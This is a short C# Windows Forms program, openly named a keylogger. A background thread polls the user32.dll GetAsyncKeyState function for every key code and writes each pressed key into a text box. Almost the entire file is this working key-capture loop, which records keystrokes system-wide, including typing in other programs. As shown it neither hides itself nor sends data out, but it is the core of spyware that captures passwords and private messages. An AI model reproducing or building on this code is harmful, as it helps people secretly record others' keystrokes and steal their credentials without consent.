using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Threading;

namespace Keylogger
{
    public partial class Form1 : Form
    {
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        public Form1()
        {
            InitializeComponent();
            Form.CheckForIllegalCrossThreadCalls = false;

            Thread ab = new Thread(StartLogging);
            ab.Start();
        }

        void StartLogging()
        {
            while (true)
            {
                //sleeping for while, this will reduce load on cpu
                Thread.Sleep(10);
                for (Int32 i = 0; i < 255; i++)
                {
                    int keyState = GetAsyncKeyState(i);
                    if (keyState == 1 || keyState == -32767)
                    {
                        textBox1.AppendText("" + (Keys)i);
                        break;
                    }
                }
            }
        }
    }
}
